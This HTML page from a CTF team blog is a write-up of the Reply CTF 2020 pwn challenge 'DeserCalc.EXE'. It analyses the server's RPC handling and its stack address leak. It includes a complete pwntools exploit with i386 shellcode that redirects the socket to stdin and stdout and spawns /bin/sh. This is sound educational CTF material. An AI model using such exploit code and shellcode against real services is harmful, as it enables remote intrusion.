<!DOCTYPE html>
<html lang="en">

	<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="author" content="Alessandro Versari">

    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>fibonhack | DeserCalc.EXE</title>

    <link rel="stylesheet" href="/assets/css/style.css">
    <script src="/assets/js/main.js"></script>

    <link rel="shortcut icon" href="/assets/images/favicon.png">

    <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?..."></script>


    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-M77YSCBXZY"></script>
    <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());

     gtag('config', 'G-M77YSCBXZY');
    </script>

</head>


		<body class="no-js bg-zinc-900 h-screen flex flex-col justify-between">

			<div>
    <nav class="w-full p-6 flex flex-col items-center justify-center my-3">

    <img class="w-2/5 md:w-1/4 lqip" data-src="/logo/transparent/800.png" src="/logo/transparent/100.png" alt="fibonhack"/>

    </nav>

    <nav class="md:py-6">
        <!-- whide screen navbar -->
        <div class="mx-auto max-w-7xl px-2 sm:px-6 lg:px-8">
          <div class="hidden sm:block relative flex h-16 items-center justify-between">
            <div class="flex flex-1 items-center justify-center sm:items-stretch sm:justify-center">
              <div class="sm:ml-6">
                <div class="flex space-x-4">

                  
                    <a href=/ class="hover:border-1 border-zinc-600 hover:border-dashed hover:border-b px-3 py-2 text-xl  text-zinc-300 font-medium " >Home</a>
                  
                    <a href=/resources class="hover:border-1 border-zinc-600 hover:border-dashed hover:border-b px-3 py-2 text-xl  text-zinc-300 font-medium " >Resources</a>
                  
                    <a href=/posts class="hover:border-1 border-zinc-600 hover:border-dashed hover:border-b px-3 py-2 text-xl  text-zinc-300 font-medium " >Posts</a>
                  
                    <a href=/writeups class="hover:border-1 border-zinc-600 hover:border-dashed hover:border-b px-3 py-2 text-xl  text-zinc-300 font-medium " >Writeups</a>
                  
                    <a href=/events class="hover:border-1 border-zinc-600 hover:border-dashed hover:border-b px-3 py-2 text-xl  text-zinc-300 font-medium " >Events</a>
                  
                </div>
              </div>
            </div>
          </div>
        </div>

        <!-- mobile navbar -->
        <div class="sm:hidden" id="mobile-menu">
          <div class="space-y-1 px-2 pt-2 pb-3">

            
              <a href=/
                
                class="border-b border-dashed border-1 border-zinc-600 text-white block px-3 py-2 text-lg  text-zinc-300 font-medium "
              >
                Home
              </a>
            
              <a href=/resources
                
                class="border-b border-dashed border-1 border-zinc-600 text-white block px-3 py-2 text-lg  text-zinc-300 font-medium "
              >
                Resources
              </a>
            
              <a href=/posts
                
                class="border-b border-dashed border-1 border-zinc-600 text-white block px-3 py-2 text-lg  text-zinc-300 font-medium "
              >
                Posts
              </a>
            
              <a href=/writeups
                
                class="border-b border-dashed border-1 border-zinc-600 text-white block px-3 py-2 text-lg  text-zinc-300 font-medium "
              >
                Writeups
              </a>
            
              <a href=/events
                
                class="border-b border-dashed border-1 border-zinc-600 text-white block px-3 py-2 text-lg  text-zinc-300 font-medium "
              >
                Events
              </a>
            
          </div>
        </div>
    </nav>
    <nav class="flex flex-wrap mx-auto w-full container md:px-0 px-4 text-white text-lg">
        <span class="text-green-500">fibonhack@templeos</span>
        <p>:</p>
        <span class="text-blue-400">~/DeserCalc.EXE</span>
        <p>$</p>
        <div class="ml-1 ">
            cat page.txt
        </div>
    </nav>

</div>

  	  
			<div class="
				 
				main
				prose prose-invert 
				!container w-full
				mb-auto px-4 mx-auto py-6
				text-zinc-300
				"
			>
				<div class="post">
  <article class="post-content">
  <div class="post">

  <header class="post-header" style="padding-bottom: 0.8em;">
    <p> 10 Oct 2020 </p>
    <h1 style="margin: -0.02em auto;"> DeserCalc.EXE - reply ctf 2020 - pwn</h1>
    <div id="authors"> by
    
    
      
      <a href="/members/nick0ve">nick0ve</a>
      
    
    
    </div>
  </header>

  <article class="post-content">
  <h2 id="program-description">Program description</h2>
<p>Two files are given, <a href="https://github.com/fibonhack/fibonhack.github.io/blob/master/_posts/2020/reply2020/DeserCalc.EXE/server?raw=true">client</a> and <a href="https://github.com/fibonhack/fibonhack.github.io/blob/master/_posts/2020/reply2020/DeserCalc.EXE/client?raw=true">server</a> , but only the server is worth analyzing.</p>

<p>It is a forking server, the function which handles the connection is located @ 0x08049882.</p>

<p>It exchanges messages with the client by using a struct like that</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">RPC</span> <span class="p">{</span>
    <span class="n">uint32</span> <span class="n">addr</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">msg</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The handler function:</p>
<ul>
  <li>check if the first msg received is <code class="language-plaintext highlighter-rouge">JustPwnThis!</code></li>
  <li>reply with the string OK</li>
  <li>send an RPC object containing the address of do_calculation</li>
  <li>receive an RPC object and assert that received_RPC.addr == do_calculation</li>
  <li>then send another RPC object where send_RPC.addr == do_calculation - stack_buffer
    <ul>
      <li>So it is easy to calculate stack_buffer = do_calculation - send_RPC.addr</li>
    </ul>
  </li>
  <li>receive 2 RPC ojects and execute the function @ RPC[1].addr</li>
</ul>

<p>handler pseudocode:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">client_fd</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span> <span class="p">[</span><span class="mi">100</span><span class="p">];</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">local_18</span><span class="p">;</span>
  <span class="n">RPC</span> <span class="o">*</span><span class="n">rpc_obj</span><span class="p">;</span>
  
  <span class="n">log</span><span class="p">(</span><span class="sc">'I'</span><span class="p">,</span><span class="s">"PID %d: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">_Var1</span><span class="p">,</span><span class="s">"Incoming connection..."</span><span class="p">,</span> <span class="n">getpid</span><span class="p">());</span>
  <span class="k">if</span> <span class="n">check_password</span><span class="p">(</span><span class="n">client_fd</span><span class="p">,</span><span class="s">"JustPwnThis!"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">send_nullterminated</span><span class="p">(</span><span class="n">client_fd</span><span class="p">,</span><span class="s">"WRONG</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">send_nullterminated</span><span class="p">(</span><span class="n">client_fd</span><span class="p">,</span><span class="s">"OK</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">send_RPC_docalc</span><span class="p">(</span><span class="n">client_fd</span><span class="p">);</span>
    <span class="n">rpc_obj</span> <span class="o">=</span> <span class="n">alloc_RPC_structs</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
    
    <span class="k">if</span> <span class="p">(</span><span class="n">check_RPC_addr_and_leak_param3</span><span class="p">(</span><span class="n">client_fd</span><span class="p">,</span><span class="n">rpc_obj</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span><span class="n">buf</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span><span class="s">"PID %d: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">_Var1</span><span class="p">,</span><span class="s">"exiting. reason: wrong RPC address..."</span><span class="p">,</span> <span class="n">getpid</span><span class="p">());</span>
      <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">recv_2_RPC_structs</span><span class="p">(</span><span class="n">client_fd</span><span class="p">,</span><span class="n">rpc_obj</span><span class="p">);</span>
      <span class="n">local_18</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="p">)</span><span class="n">rpc_obj</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">RPC_addr</span><span class="p">)(</span><span class="n">buf</span><span class="p">);</span>
      <span class="n">send_RPC_docalc_msg</span><span class="p">(</span><span class="n">client_fd</span><span class="p">,</span><span class="n">local_18</span><span class="p">);</span>
      <span class="n">log</span><span class="p">(</span><span class="sc">'I'</span><span class="p">,</span><span class="s">"PID %d: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">_Var1</span><span class="p">,</span><span class="s">"exiting normally..."</span><span class="p">,</span> <span class="n">getpid</span><span class="p">());</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="exploit">Exploit</h2>
<p>checksec server output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
</code></pre></div></div>
<p>NX is disabled so it is possible to just jump at the stack buffer leaked by the server</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span>

<span class="c1"># Set up pwntools for the correct architecture
</span><span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span><span class="p">)</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./server'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s">'''Start the exploit against the target.'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s">'gamebox1.reply.it'</span><span class="p">,</span> <span class="mi">27364</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">8000</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">RPC</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">100</span><span class="p">:</span>
        <span class="n">msg</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x41</span><span class="s">'</span>
    <span class="k">return</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">msg</span>


<span class="n">shellcode</span> <span class="o">=</span> <span class="s">'''
    mov ebx, 0x08049300 # close

# close(0)
    push 0
    call ebx

# close(1)
    push 1
    call ebx

    mov ebx, 0x08049050 # dup2

# dup2(4,0)
    push 0
    push 4 
    call ebx

# dup2(4,1)
    push 1
    push 4 
    call ebx

# execve binbash
    xor    eax, eax
    push   eax
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx, esp
    mov    ecx, eax
    mov    edx, eax
    mov    al, 0xb
    int    0x80
'''</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="n">password</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'JustPwnThis!'</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Password:'</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'OK</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">DO_CALCULATION</span> <span class="o">=</span> <span class="mh">0x0804a8c8</span>

<span class="n">scode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span><span class="p">)</span>

<span class="c1"># this scode is gonna be stored in buf of handler function
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">RPC</span><span class="p">(</span><span class="n">DO_CALCULATION</span><span class="p">,</span> <span class="n">scode</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">RPC1</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">bufleak</span> <span class="o">=</span> <span class="p">(</span><span class="n">DO_CALCULATION</span> <span class="o">-</span> <span class="n">u32</span><span class="p">(</span><span class="n">RPC1</span><span class="p">[:</span><span class="mi">4</span><span class="p">]))</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
<span class="k">print</span> <span class="p">(</span><span class="s">"buf @ %08x"</span> <span class="o">%</span> <span class="p">(</span><span class="n">bufleak</span><span class="p">))</span>

<span class="s">'''
Sending 
- garbage RPC
- RPC (function_to_execute=scode_location, garbage)
'''</span>
<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">RPC</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="s">''</span><span class="p">)</span><span class="o">+</span><span class="n">RPC</span><span class="p">(</span><span class="n">bufleak</span><span class="p">,</span><span class="sa">b</span><span class="s">''</span><span class="p">))</span>

<span class="c1"># get a shell
</span><span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>The shellcode closes stdin,stdout, redirect stdin and stdout to the client_fd with dup2(client_fd,1) dup2(client_fd,0), then it does the classic execve(binbash)</p>

  </article>
</div>

  </article>

</div>

			</div>

	<nav class="
     
    flex flex-wrap mx-auto w-full md:px-0 px-4 text-white text-lg mb-6 
    container
    terminal
    "
>
    <span class="text-green-500">fibonhack@templeos</span>
    <p>:</p>
    <span class="text-blue-400">~/DeserCalc.EXE</span>
    <p>$</p>
    <form class="terminal_form flex ml-1 relative">
        <input type="text" spellcheck="false" class="border-transparent focus:border-transparent focus:ring-0 w-full bg-transparent focus:outline-0 border-none">
    </form>
</nav>

<footer class="
         
        space-y-6 md:space-y-0 flex flex-col md:flex-row text-white justify-between 
        w-full py-12 px-6 space-y-6 border-t border-dashed border-1 border-zinc-600 items-center
    "
>

    <div class="flex-1 items-center">
        theme developed by <a class="underline" href="https://github.com/just-hms/">just-hms</a> 
    </div>

    <div class="space-x-4 flex items-center justify-center">
        <a class="text-zinc-600 hover:text-zinc-100" href="https://github.com/fibonhack">
            <svg class="w-8 h-8" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
    <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" />
</svg>
        </a>
    
        <a class="text-zinc-600 hover:text-blue-400" href="https://twitter.com/fibonhack">
            <svg class="w-8 h-8" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
    <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z"/>
</svg>
            
        </a>
    
        <a class="saturate-0 contrast-[.75] brightness-[.75] hover:brightness-100 hover:contrast-100 hover:saturate-[.40]" href="https://ctftime.org/team/117538">
            <svg class="w-auto h-8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 283.46 79.33" style="enable-background:new 0 0 283.46 79.33;" xml:space="preserve">
	<style type="text/css">
		.st0{fill:#E3000B;}
		.st1{fill:#FFFFFF;}
	</style>
	<g id="Layer_1">
		<polygon class="st0" points="0,79.52 154.36,79.52 283.46,79.52 283.46,0.19 0,0.19 33.23,40.29  "/>
		<polygon class="st1" points="61.92,57.92 80.47,57.92 80.47,51.68 74.06,51.68 74.06,51.68 69.3,51.68 69.3,27.9 74.06,27.9    74.06,27.9 80.47,27.9 80.47,21.02 61.92,21.02  "/>
		<polygon class="st1" points="86.32,28.11 91.6,28.11 91.6,57.92 98.98,57.92 98.98,28.11 104.25,28.11 104.25,21.02 86.32,21.02     "/>
		<polygon class="st1" points="110.3,57.63 117.69,57.63 117.69,42.88 126.9,42.88 126.9,37.15 117.69,37.15 117.69,27.9    129.02,27.9 129.02,21.02 110.3,20.73  "/>
		<polygon class="st1" points="182.79,25.34 188.33,25.34 188.33,57.92 192.76,57.92 192.76,25.34 198.29,25.34 198.29,21.02    182.79,21.02  "/>
		<rect x="203.31" y="21.02" class="st1" width="4.43" height="36.9"/>
		<polygon class="st1" points="224.16,34.52 218.89,21.02 214.52,21.02 214.52,57.92 218.89,57.92 218.89,31.78 224.16,45.06    229.43,31.78 229.43,57.92 233.81,57.92 233.81,21.02 229.43,21.02  "/>
		<polygon class="st1" points="244.77,53.6 244.77,41.58 252.15,41.58 252.15,37.26 244.77,37.26 244.77,25.34 256.88,25.34    258.04,21.02 240.34,21.02 240.34,57.92 257.85,57.92 256.69,53.6  "/>
		<path class="st1" d="M135.54,21.02v36.9h39.7v-36.9H135.54z M169.83,52.89h-28.87V26.05h28.87V52.89z"/>
		<polygon class="st1" points="153.91,39.38 147.8,45.48 151.83,49.05 161.24,39.65 145.16,23.57 138.1,23.57  "/>
	</g>
</svg>
        </a>
    </div>
    
</footer>

	</body>
</html>
